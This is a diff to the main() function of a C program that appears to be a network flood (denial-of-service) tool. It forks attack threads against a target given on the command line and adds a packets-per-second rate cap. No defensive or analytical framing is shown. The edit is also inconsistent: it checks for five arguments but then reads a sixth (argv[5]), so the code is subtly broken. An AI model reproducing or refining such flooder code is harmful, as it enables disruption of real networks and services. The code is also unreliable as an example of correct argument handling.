@@ -105,18 +105,17 @@ void cycle_identity() {
 int main(int argc, char **argv) {
 	int x,i;
 	
-	
-	if(argc !=4)
+	if(argc !=5)
 		cycle_identity();
 	for(x=0; x != THREADS; x++) {
 		if(fork())
 			attack(argv[1], argv[2], x);
 		
 	}
-	
+	int maxpps = atoi(argv[4]);
         int multiplier = 20;
 	fprintf(stdout, "Starting Flood...\n");
-	for(i = 0;i<(atoi(argv[4])*multiplier);i++)
+	for(i = 0;i<(atoi(argv[5])*multiplier);i++)
 	{
 		usleep((1000/multiplier)*1000);
 		if((pps*multiplier) > maxpps)
